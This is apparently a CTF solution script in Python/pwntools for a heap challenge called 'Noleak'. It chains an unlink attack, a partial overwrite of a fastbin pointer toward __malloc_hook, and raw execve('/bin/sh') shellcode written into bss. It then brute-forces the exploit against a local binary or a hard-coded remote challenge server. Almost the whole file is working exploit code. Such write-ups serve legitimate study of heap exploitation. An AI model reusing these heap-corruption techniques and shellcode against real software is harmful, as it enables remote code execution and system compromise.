#coding:utf-8

from pwn import *

#context.log_level = 'debug'

debug = 1

lib = ELF('./Noleak_libc')


def wp_create(size, data):
	r.recvuntil('Wellcome To the Heap World\n')
	r.send('1'.ljust(8, '\x00'))

	r.send(str(size).ljust(8, '\x00'))

	r.send(data.ljust(size, '\x00'))

	
def wp_delete(index):
	r.recvuntil('Wellcome To the Heap World\n')
	r.send('2'.ljust(8, '\x00'))

	r.send(str(index).ljust(8, '\x00'))

def wp_update(index, data):
	r.recvuntil('Wellcome To the Heap World\n')
	r.send('3'.ljust(8, '\x00'))

	r.send(str(index).ljust(8, '\x00'))
	
	r.send(str(len(data)).ljust(8, '\x00'))

	r.send(data)

def wp_exit():
	r.recvuntil('Wellcome To the Heap World\n')
	r.send('4'.ljust(8, '\x00'))

def wp_main():
	#	指的是能包括__malloc_hook的fastbin的低三位地址
	__malloc_hook_fastbin_l3b = (lib.symbols['__malloc_hook'] & 0xfff) | 0x1000
	bss_address = 0x0000000000601020

	#	unlink攻击,  buf[0] = buf[-3]
	wp_create(0x98, 'a')		#index:0
	wp_create(0x98, 'a')		#index:1
	wp_update(0, p64(0x0) + p64(0x91) + p64(0x0000000000601040 - 0x18) + p64(0x0000000000601040 - 0x10) + p64(0) * 7 * 2 + p64(0x90) + p64(0xa0))
	wp_delete(1)			# buf[0]值为0x601020	buf[1]值为buf
	wp_update(0, p64(0) * 3 + p64(bss_address) + p64(0x0000000000601040) + p64(0) * 0x3 + p64(0x20))
	wp_create(0x100, 'a')		#index:2
	wp_create(0x100, 'a')		#index:3
	wp_delete(2)
	wp_update(2, p64(0) + p64(0x0000000000601040 + 0x8 * 4))
	wp_create(0x100, 'a')		#index:4

	wp_update(1, p64(bss_address) + '/bin/sh\x00' + p64(0) * 4 + p64(__malloc_hook_fastbin_l3b)[:2])

	wp_update(6, p64(bss_address))
	
	

	shellcode = "\x48\x31\xc0\x48\xc7\xc0\x3b\x00\x00\x00\x48\x31\xff\x48\xc7\xc7\x48\x10\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05"
	
	wp_update(0, shellcode)

	r.recvuntil('Wellcome To the Heap World\n')
	r.send('1'.ljust(8, '\x00'))

	r.send(str(0x20).ljust(8, '\x00'))
	
	for i in range(0x20):
		r.recv(timeout = 0.1)


while True:
	try:
		log.info("[*] try to crack-------\n")

		if debug == 1:
			r = process('./Noleak', env = {"LD_PRELOAD":"./Noleak_libc"})
			#gdb.attach(r)
			#pause()	# 进行下断点
		else:
			r = remote('111.198.29.45', 45427)

		wp_main()
		r.interactive()
		break
	except EOFError:
        	r.close()
		continue
